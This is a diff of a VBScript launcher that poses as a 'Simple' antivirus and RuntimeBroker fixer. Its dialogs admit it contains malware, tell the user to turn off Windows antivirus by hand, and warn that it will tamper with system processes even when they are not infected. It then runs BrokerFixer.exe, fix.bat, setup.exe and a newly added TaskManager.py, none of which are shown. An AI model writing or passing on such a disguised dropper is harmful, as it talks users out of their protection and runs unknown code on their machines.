@@ -1,7 +1,7 @@
 DIM FSO, MyFile
 Set oShell = CreateObject( "WScript.Shell" )
 Set FSO = CreateObject("Scripting.FileSystemObject")
-answer = MsgBox("Disclaimer: our program does consist of a malware, this malwares function is to turn off your antivirus and run this program. Knowing this information would you like to proceed?", vbQuestion + vbYesNo + vbDefaultButton2, "!!!WARNING!!!")
+answer = MsgBox("Disclaimer: Our program does consist of a malware, this malwares function is to turn off your antivirus and run this program. Knowing this information would you like to proceed?", vbQuestion + vbYesNo + vbDefaultButton2, "!!!WARNING!!!")
 
 If answer = vbYes Then
   WScript.sleep(5) 
@@ -10,13 +10,14 @@ If answer = vbYes Then
   b=MsgBox("Please finish the setup by manualy turning off your Windoes AntiVirus, this is to assure that our program will run properly.", 0+64, "Simple")
   c=MsgBox("Important: Some malware disguises itself as RuntimeBroker.exe, Isass.exe, MsDtsSrvr.exe or other common windows files..., particularly when not located in the C:\Windows\System32 folder. Therefore, you should check the RuntimeBroker.exe process on your PC to see if it is a threat. Because of this we will check if any of these are malware, if found we will fix the RuntimeBroker executable and replace it with a default one.", 0+64, "Simple")
   
-  answer = MsgBox("Disclaimer: We want to scan your RuntimeBrokers... this will run a exe file and will give you an error, it will tamper with the RuntimeBrokers... to make sure they arn't infected with or are malware. Knowing this information would you like to run or not run this program?", vbQuestion + vbYesNo + vbDefaultButton2, "!!!WARNING!!!")
+  answer = MsgBox("Disclaimer: We want to scan your RuntimeBrokers and other processes... This will run the program 'BrokerFixer.exe' and will tamper with you runtime brokers even if they are not infected, it will then check the most common windows 10 background apps for anything Suspicious.    Would you like to run this task?", vbQuestion + vbYesNo + vbDefaultButton2, "???Question???")
   
   If answer = vbYes Then
     CreateObject("WScript.Shell").Run "simple/BrokerFixer.exe"
+    CreateObject("WScript.Shell").Run "simple/TaskManager.py"
     WScript.sleep(500)
-    d=MsgBox("We have succsessfuly scanned some of your Runtime Brokers, and have tampered with them.", 0+64, "Simple")
-    CreateObject("WScript.Shell").Run ""simple/fix.bat"
+    d=MsgBox("Succesefull, close this prompt to run the next task", 0+64, "Simple")
+    CreateObject("WScript.Shell").Run "simple/fix.bat"
     f=MsgBox("Click any button below to run our simple antivirus.", 0+64, "Simple")
     CreateObject("WScript.Shell").Run "simple/complex/setup.exe"
  
